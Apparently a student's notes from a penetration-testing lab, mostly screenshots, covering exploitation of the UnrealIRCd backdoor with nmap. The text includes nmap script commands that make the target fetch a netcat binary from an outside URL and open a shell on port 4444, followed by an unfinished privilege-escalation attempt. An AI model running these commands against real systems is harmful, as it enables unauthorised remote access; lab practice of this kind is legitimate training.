recon

![image](https://user-images.githubusercontent.com/83407557/182646813-1cf0090d-e378-4c69-8168-c0bf57aabdba.png)


searchsploit 

![image](https://user-images.githubusercontent.com/83407557/182646900-69397f1f-53cf-40ed-a66c-580023b4e641.png)

nse 

nmap -d -p6667 --script=irc-unrealircd-backdoor.nse 192.168.81.120

nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://192.168.49.81/test' 192.168.81.120

verify that I can ping myself

![image](https://user-images.githubusercontent.com/83407557/182649442-ccf3b1f3-6737-4490-b6e5-e27eafd6ffc5.png)



nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>


  
  
  
  
  making a revshell
  
 ![image](https://user-images.githubusercontent.com/83407557/182650425-b8191898-51d5-4b8c-a985-a2bc8107ad3b.png)

  proof
  
  ![image](https://user-images.githubusercontent.com/83407557/182651131-90a0eda5-61f2-48dd-b311-b15ab0609233.png)

  
  priv esc
  
  Found in current user's home folder
  
  ![image](https://user-images.githubusercontent.com/83407557/182654840-cb733925-0c28-4950-a91d-6cc291c30d6b.png)

  ![image](https://user-images.githubusercontent.com/83407557/182655731-26110974-b6a2-445b-8310-a15885526888.png)
  
  still writeable...ect and owned by root
  
  ![image](https://user-images.githubusercontent.com/83407557/182655853-b3952255-3cf5-426c-a8a8-721798c5c33f.png)


making the exploit
  
  just need to switch to root:
  
  
  
  ran out of time.
